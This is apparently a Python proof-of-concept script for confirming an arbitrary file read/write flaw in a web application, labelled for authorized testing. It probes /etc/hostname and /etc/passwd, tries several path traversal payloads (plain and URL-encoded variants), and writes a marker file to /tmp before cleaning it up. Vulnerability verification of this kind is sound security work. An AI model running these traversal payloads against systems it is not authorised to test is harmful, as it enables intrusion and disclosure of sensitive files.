#!/usr/bin/env python3
"""
PoC: Arbitrary File Read/Write - VULN-AFRW-001

Vulnerability:
    Arbitrary file read/write vulnerabilities occur when an application allows
    users to specify file paths in requests without proper sanitization or
    access control. Attackers can read sensitive files (e.g., /etc/passwd,
    configuration files) or write arbitrary content to the filesystem, which
    can lead to remote code execution, data exfiltration, or denial of service.

Test methodology:
    READ test:
        1. Send a request that attempts to read a known file (/etc/hostname).
        2. Verify the response contains plausible file content (not an error page).

    WRITE test:
        1. Generate a unique marker string.
        2. Send a request that attempts to write the marker to /tmp/<unique_file>.
        3. Attempt to read the file back through the same vulnerability.
        4. Verify the marker is present in the read-back response.
        5. Attempt cleanup of the written file.

Usage:
    python poc_arbitrary_file_rw_001.py --target http://localhost:8080 \\
        --read-endpoint "/api/files/download?path={filepath}" \\
        --write-endpoint "/api/files/upload"

Exit codes:
    0 = CONFIRMED  (file read and/or write succeeded)
    1 = NOT_REPRODUCED  (neither read nor write could be demonstrated)
    2 = ERROR  (script encountered an error)

AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import json
import os
import string
import sys
import time
import uuid

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


def parse_args():
    parser = argparse.ArgumentParser(
        description="PoC for Arbitrary File Read/Write (VULN-AFRW-001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED SECURITY TESTING ONLY.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--read-endpoint",
        default="/api/files/download?path={filepath}",
        help="Endpoint template for file read. Use {filepath} as placeholder.",
    )
    parser.add_argument(
        "--write-endpoint",
        default="/api/files/upload",
        help="Endpoint for file write operations.",
    )
    parser.add_argument(
        "--read-file",
        default="/etc/hostname",
        help="File to attempt reading (default: /etc/hostname)",
    )
    parser.add_argument(
        "--write-dir",
        default="/tmp",
        help="Directory to attempt writing to (default: /tmp)",
    )
    parser.add_argument(
        "--param-name",
        default="path",
        help="Parameter name for file path in write requests (default: path)",
    )
    parser.add_argument(
        "--method",
        choices=["get", "post"],
        default="get",
        help="HTTP method for read requests (default: get)",
    )
    parser.add_argument(
        "--skip-read",
        action="store_true",
        help="Skip the file read test",
    )
    parser.add_argument(
        "--skip-write",
        action="store_true",
        help="Skip the file write test",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

COMMON_ERROR_SIGNATURES = [
    "file not found",
    "no such file",
    "access denied",
    "permission denied",
    "forbidden",
    "404",
    "error",
    "exception",
    "stack trace",
    "traceback",
]


def looks_like_file_content(text, expected_file):
    """Heuristic check: does the response look like real file content?"""
    if not text or len(text.strip()) == 0:
        return False

    lower = text.lower()

    # If the response is mostly error messages, it's not file content
    error_hits = sum(1 for sig in COMMON_ERROR_SIGNATURES if sig in lower)
    if error_hits >= 2:
        return False

    # /etc/hostname should be a short hostname string
    if "hostname" in expected_file:
        stripped = text.strip()
        # Hostnames are typically short alphanumeric strings
        if 1 <= len(stripped) <= 255 and all(
            c in string.ascii_letters + string.digits + ".-_" for c in stripped
        ):
            return True

    # /etc/passwd has a recognizable format
    if "passwd" in expected_file:
        if "root:" in text and ":" in text:
            return True

    # Generic: if we got non-trivial content without error signatures, consider it a match
    if len(text.strip()) > 0 and error_hits == 0:
        return True

    return False


def build_read_url(base_url, endpoint_template, filepath):
    """Build the full URL for a file read attempt."""
    base = base_url.rstrip("/")
    if "{filepath}" in endpoint_template:
        path = endpoint_template.replace("{filepath}", filepath)
    else:
        path = endpoint_template + filepath
    return f"{base}{path}"


# ---------------------------------------------------------------------------
# Test: File Read
# ---------------------------------------------------------------------------

def test_file_read(args):
    """
    Attempt to read a file via the target application.

    Returns:
        tuple: (success: bool, detail: str)
    """
    vuln_id = "VULN-AFRW-001"
    target = args.target.rstrip("/")
    read_file = args.read_file

    print(f"[*] File Read Test")
    print(f"    Target file: {read_file}")

    url = build_read_url(target, args.read_endpoint, read_file)
    print(f"    Request URL: {url}")

    headers = {
        "User-Agent": "VulnAnalysis-PoC/1.0",
        "Accept": "*/*",
    }

    try:
        if args.method == "post":
            resp = requests.post(
                url, headers=headers, timeout=args.timeout, allow_redirects=False
            )
        else:
            resp = requests.get(
                url, headers=headers, timeout=args.timeout, allow_redirects=False
            )
    except requests.ConnectionError as exc:
        return False, f"Connection failed: {exc}"
    except requests.Timeout:
        return False, f"Request timed out after {args.timeout}s"
    except requests.RequestException as exc:
        return False, f"Request error: {exc}"

    print(f"    Response: HTTP {resp.status_code}, {len(resp.text)} bytes")

    if resp.status_code != 200:
        return False, f"Server returned HTTP {resp.status_code}"

    # Check path traversal variants if initial attempt gets blocked
    body = resp.text
    if looks_like_file_content(body, read_file):
        preview = body.strip()[:120].replace("\n", "\\n")
        print(f"    Content preview: {preview}")
        return True, f"Successfully read {read_file} ({len(body)} bytes)"

    # Try common path traversal patterns
    traversal_patterns = [
        f"../../../..{read_file}",
        f"..%2F..%2F..%2F..{read_file}",
        f"....//....//....//..../{read_file}",
        f"..%252f..%252f..%252f..{read_file}",
    ]

    for pattern in traversal_patterns:
        print(f"    Trying traversal: {pattern[:60]}...")
        trav_url = build_read_url(target, args.read_endpoint, pattern)

        try:
            if args.method == "post":
                resp = requests.post(
                    trav_url, headers=headers, timeout=args.timeout, allow_redirects=False
                )
            else:
                resp = requests.get(
                    trav_url, headers=headers, timeout=args.timeout, allow_redirects=False
                )
        except requests.RequestException:
            continue

        if resp.status_code == 200 and looks_like_file_content(resp.text, read_file):
            preview = resp.text.strip()[:120].replace("\n", "\\n")
            print(f"    Content preview: {preview}")
            return True, f"File read via traversal pattern: {pattern[:40]}"

    return False, "Could not confirm file content in any response"


# ---------------------------------------------------------------------------
# Test: File Write
# ---------------------------------------------------------------------------

def test_file_write(args):
    """
    Attempt to write a file via the target application and verify it.

    Returns:
        tuple: (success: bool, detail: str)
    """
    vuln_id = "VULN-AFRW-001"
    target = args.target.rstrip("/")

    # Generate unique marker and filename
    marker = f"VULN_AFRW_001_MARKER_{uuid.uuid4().hex[:16]}"
    filename = f"poc_afrw_{uuid.uuid4().hex[:8]}.txt"
    write_path = os.path.join(args.write_dir, filename)

    print(f"\n[*] File Write Test")
    print(f"    Target path: {write_path}")
    print(f"    Marker:      {marker}")

    write_url = f"{target}{args.write_endpoint}"
    print(f"    Write URL:   {write_url}")

    headers = {
        "User-Agent": "VulnAnalysis-PoC/1.0",
        "Content-Type": "application/json",
    }

    # Attempt 1: JSON body with path and content
    payloads = [
        {
            "description": "JSON body with path + content",
            "data": json.dumps({
                args.param_name: write_path,
                "content": marker,
                "filename": filename,
            }),
            "content_type": "application/json",
        },
        {
            "description": "Form data with path + content",
            "data": {
                args.param_name: write_path,
                "content": marker,
                "filename": filename,
            },
            "content_type": "application/x-www-form-urlencoded",
        },
    ]

    write_succeeded = False
    write_detail = ""

    for payload_info in payloads:
        print(f"    Trying: {payload_info['description']}")

        req_headers = {
            "User-Agent": "VulnAnalysis-PoC/1.0",
            "Content-Type": payload_info["content_type"],
        }

        try:
            if payload_info["content_type"] == "application/json":
                resp = requests.post(
                    write_url,
                    data=payload_info["data"],
                    headers=req_headers,
                    timeout=args.timeout,
                    allow_redirects=False,
                )
            else:
                resp = requests.post(
                    write_url,
                    data=payload_info["data"],
                    headers=req_headers,
                    timeout=args.timeout,
                    allow_redirects=False,
                )
        except requests.ConnectionError as exc:
            print(f"    Connection failed: {exc}")
            continue
        except requests.Timeout:
            print(f"    Timed out after {args.timeout}s")
            continue
        except requests.RequestException as exc:
            print(f"    Request error: {exc}")
            continue

        print(f"    Write response: HTTP {resp.status_code}")

        if resp.status_code in (200, 201, 204):
            write_succeeded = True
            write_detail = payload_info["description"]
            break

    if not write_succeeded:
        return False, "All write attempts returned non-success status codes"

    # -------------------------------------------------------------------------
    # Verify the write by reading the file back
    # -------------------------------------------------------------------------
    print(f"\n[*] Verifying write by reading back {write_path}...")

    read_url = build_read_url(target, args.read_endpoint, write_path)
    print(f"    Read-back URL: {read_url}")

    try:
        verify_resp = requests.get(
            read_url,
            headers={"User-Agent": "VulnAnalysis-PoC/1.0"},
            timeout=args.timeout,
            allow_redirects=False,
        )
    except requests.RequestException as exc:
        return False, f"Write appeared to succeed but read-back failed: {exc}"

    print(f"    Read-back response: HTTP {verify_resp.status_code}, {len(verify_resp.text)} bytes")

    if verify_resp.status_code == 200 and marker in verify_resp.text:
        print(f"    Marker FOUND in read-back response!")

        # Attempt cleanup
        _attempt_cleanup(target, args, write_path)

        return True, (
            f"File write confirmed via {write_detail}. "
            f"Marker verified at {write_path}."
        )

    # Write got 200 but we can't verify the marker was written
    # The write endpoint might have returned 200 generically
    print(f"    Marker NOT found in read-back response.")
    return False, (
        f"Write endpoint returned success but marker not found on read-back. "
        f"Write may not have actually persisted."
    )


def _attempt_cleanup(target, args, filepath):
    """Best-effort cleanup of the written test file."""
    print(f"\n[*] Attempting cleanup of {filepath}...")
    # Try a DELETE request to a plausible endpoint
    delete_url = f"{target.rstrip('/')}/api/files/delete"
    try:
        resp = requests.post(
            delete_url,
            json={"path": filepath},
            headers={"User-Agent": "VulnAnalysis-PoC/1.0"},
            timeout=5,
        )
        if resp.status_code in (200, 204):
            print(f"    Cleanup succeeded.")
        else:
            print(f"    Cleanup returned HTTP {resp.status_code} (manual cleanup may be needed).")
    except requests.RequestException:
        print(f"    Cleanup request failed (manual cleanup may be needed).")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()
    vuln_id = "VULN-AFRW-001"

    if not _HAS_REQUESTS:
        print("[ERROR] VULN-AFRW-001: 'requests' library is required. "
              "Install with: pip install requests")
        sys.exit(2)

    print("=" * 70)
    print("  PoC: Arbitrary File Read/Write")
    print(f"  Vulnerability ID: {vuln_id}")
    print("=" * 70)
    print(f"  Target:         {args.target}")
    print(f"  Read endpoint:  {args.read_endpoint}")
    print(f"  Write endpoint: {args.write_endpoint}")
    print(f"  Read file:      {args.read_file}")
    print(f"  Write dir:      {args.write_dir}")
    print(f"  Timeout:        {args.timeout}s")
    print("=" * 70)
    print()

    start_time = time.monotonic()
    read_ok = False
    write_ok = False
    read_detail = "Skipped"
    write_detail = "Skipped"

    # Run tests
    try:
        if not args.skip_read:
            read_ok, read_detail = test_file_read(args)
            print(f"\n    Read result: {'VULNERABLE' if read_ok else 'Not confirmed'}")
            print(f"    Detail: {read_detail}")
        else:
            print("[*] File read test skipped (--skip-read)")

        if not args.skip_write:
            write_ok, write_detail = test_file_write(args)
            print(f"\n    Write result: {'VULNERABLE' if write_ok else 'Not confirmed'}")
            print(f"    Detail: {write_detail}")
        else:
            print("[*] File write test skipped (--skip-write)")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(2)
    except Exception as exc:
        print(f"\n[ERROR] {vuln_id}: Unexpected error - {exc}")
        sys.exit(2)

    elapsed = time.monotonic() - start_time

    # Determine overall result
    print()
    print("-" * 70)

    if read_ok and write_ok:
        result = f"[CONFIRMED] {vuln_id}: Both arbitrary file READ and WRITE confirmed."
        exit_code = 0
    elif read_ok:
        result = f"[CONFIRMED] {vuln_id}: Arbitrary file READ confirmed. Write not confirmed."
        exit_code = 0
    elif write_ok:
        result = f"[CONFIRMED] {vuln_id}: Arbitrary file WRITE confirmed. Read not confirmed."
        exit_code = 0
    else:
        result = f"[NOT_REPRODUCED] {vuln_id}: Neither file read nor write could be confirmed."
        exit_code = 1

    print(f"  Read:    {read_detail}")
    print(f"  Write:   {write_detail}")
    print(f"  Result:  {result}")
    print(f"  Elapsed: {elapsed:.2f}s")
    print("-" * 70)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
